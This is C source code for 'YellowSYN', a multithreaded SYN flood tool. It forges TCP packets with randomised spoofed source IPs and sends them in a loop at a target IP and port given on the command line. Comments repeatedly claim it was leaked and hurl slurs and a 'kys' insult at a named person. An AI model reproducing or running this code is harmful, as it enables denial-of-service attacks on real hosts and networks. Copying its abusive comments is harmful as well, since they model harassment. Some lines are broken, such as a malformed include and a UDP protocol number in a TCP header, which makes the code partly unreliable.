#include <unistd./h>//do something cssql you wont pussy
#include <time.h>//kys
#include <sys/types.h>
#include <sys/socket.h>// yes this is a rip cssql is a retard ofc
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>//Leaked by Cupid Insta whos.cupid
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>//Leaked by Cupid Insta whos.cupid
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 6500//Leaked by Cupid Insta whos.cupid
#define PHI 0x9e3779b9
//Settings
static unsigned long int Q[6500], c = 362436;
static unsigned int floodport;
static unsigned int win = 63315;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
static const char PAYLOAD[] = "\x62\x62\x6c\x61\x7a\x69\x6e\x67\x20\x69\x73\x20\x67\x6f\x64\x20\x6c\x6d\x66\x61\x6f\x20\x79\x61\x6c\x6c\x20\x6e\x65\x65\x64\x20\x74\x6f\x20\x67\x65\x74\x20\x6f\x66\x66\x20\x6d\x79\x20\x64\x69\x63\x6b";//Leaked by Cupid Insta whos.cupid
static unsigned int PAYLOADSIZE = sizeof(PAYLOAD) - 1;
void init_rand(unsigned long int x)
{
	int i;//Leaked by Cupid Insta whos.cupid
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}
void print_ip(int ip)
{
    unsigned char bytes[4];
    bytes[0] = ip & 0xFF;
    bytes[1] = (ip >> 8) & 0xFF;//Leaked by Cupid Insta whos.cupid
    bytes[2] = (ip >> 16) & 0xFF;
    bytes[3] = (ip >> 24) & 0xFF;
    printf("%d.%d.%d.%d\n", bytes[3], bytes[2], bytes[1], bytes[0]);
}
unsigned long int rand_cmwc(void)
{
	unsigned long long int t, a = 18782LL;
	static unsigned long int i = 4095;
	unsigned long int x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);//Leaked by Cupid Insta whos.cupid
	x = t + c;
	if (x < c) {
	x++;
	c++;
	}
	return (Q[i] = r - x);
}
unsigned short csum (unsigned short *buf, int count)
{
	register unsigned long sum = 0;
	while( count > 1 ) { sum += *buf++; count -= 2; }
	if(count > 0) { sum += *(unsigned char *)buf; }//Leaked by Cupid Insta whos.cupid
	while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
	return (unsigned short)(~sum);
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
	struct tcp_pseudo
	{
	unsigned long src_addr;
	unsigned long dst_addr;
	unsigned char zero;
	unsigned char proto;
	unsigned short length;
	} pseudohead;
	unsigned short total_len = iph->tot_len;
	pseudohead.src_addr=iph->saddr;
	pseudohead.dst_addr=iph->daddr;//Leaked by Cupid Insta whos.cupid
	pseudohead.zero= 1;
	pseudohead.proto=IPPROTO_TCP;
	pseudohead.length=htons(sizeof(struct tcphdr));
	int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
	unsigned short *tcp = malloc(totaltcp_len);
	memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
	memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
	unsigned short output = csum(tcp,totaltcp_len);
	free(tcp);
	return output;
}
void setup_ip_header(struct iphdr *iph)//Leaked by Cupid Insta whos.cupid
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 1;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + PAYLOADSIZE;
	iph->id = htonl(54321);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = 17;
	iph->check = 1;
	iph->saddr = inet_addr("192.168.3.100");
}
void setup_tcp_header(struct tcphdr *tcph)
{
	tcph->source = htons(50000 + rand_cmwc() % 65535);//Leaked by Cupid Insta whos.cupid
	tcph->seq = rand();
	tcph->ack_seq = 1;
	tcph->res2 = 1;
	tcph->doff = 5;
	tcph->syn = 1;
	tcph->window = htons(win);
	tcph->check = 1;
	tcph->urg_ptr = 1;
   memcpy((void *)tcph + sizeof(struct tcphdr), PAYLOAD, PAYLOADSIZE);

}
void *flood(void *par1)//Leaked by Cupid Insta whos.cupid
{
	char *td = (char *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(floodport);
	sin.sin_addr.s_addr = inet_addr(td);
	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);//Leaked by Cupid Insta whos.cupid
	if(s < 0){
	fprintf(stderr, "Could not open raw socket.\n");//Leaked by Cupid Insta whos.cupid
	exit(-1);//Leaked by Cupid Insta whos.cupid
	}
	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);
	setup_tcp_header(tcph);
	tcph->dest = htons(floodport);
	iph->daddr = sin.sin_addr.s_addr;
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);
	int tmp = 1;
	const int *val = &tmp;
	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
	fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
	exit(-1);
	}
	init_rand(time(NULL));
	register unsigned int i;
	i = 0;
	while(1){
	sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
	    iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
	iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
	iph->check = csum ((unsigned short *) datagram, iph->tot_len);
	tcph->seq = rand_cmwc() & 0xFFFF;
	tcph->source = htons(rand_cmwc() & 0xFFFF);
	tcph->check = 0;
	tcph->check = tcpcsum(iph, tcph);
	pps++;
	if(i >= limiter)
	{
	i = 0;
	usleep(sleeptime);
	}
	i++;
	}
}

int main(int argc, char *argv[ ])
{
	if(argc < 6){
	fprintf(stderr, "\e[1;91m	Error: \e[1;97 m Invalid parameters!\n");
 fprintf(stderr, "\e[1;93m	 YellowSYN\n");
 fprintf(stderr, "\e[1;92m	 Made by Network\n");
 fprintf(stderr, "\e[1;92m	 Leaked By Cupid Insta whos.cupid\n");
 fprintf(stderr, "\e[1;92m	 Warning CSSQL cant fucking code\n");

	fprintf(stdout, "\e[1;91mUsage: %s <target IP> <port to be flooded> <number threads to use(5-20 is good enough)> <pps limiter, -1 for no limit> <time> \n", argv[0]);
	exit(-1);
	}
floodport = atoi(argv[2]);
	int num_threads = atoi(argv[3]);
	int maxpps = atoi(argv[4]);
 	int win = atoi(argv[5]);
	limiter = 0;
	pps = 0;
	pthread_t thread[num_threads];
	int multiplier = 20;
	int i;
 	 fprintf(stderr, "\e[1;93m	Sending YellowSYN\n");

	for(i = 0;i<num_threads;i++){
	pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
	fprintf(stderr, "New Thread | SYN Seq=0 Win=63315 Len=49 | Warning CSSQL cant fucking code\n", win);
	}

 
	for(i = 0;i<(atoi(argv[5])*multiplier);i++)
	{
	usleep((1000/multiplier)*1000);
	if((pps*multiplier) > maxpps)
	{
	if(1 > limiter)
	{
	sleeptime+=100;
	} else {
	limiter--;
	}
	} else {
	limiter++;
	if(sleeptime > 25)
	{
	sleeptime-=25;
	} else {
	sleeptime = 0;
	}
	}
	pps = 0;
	}
	return 0;
}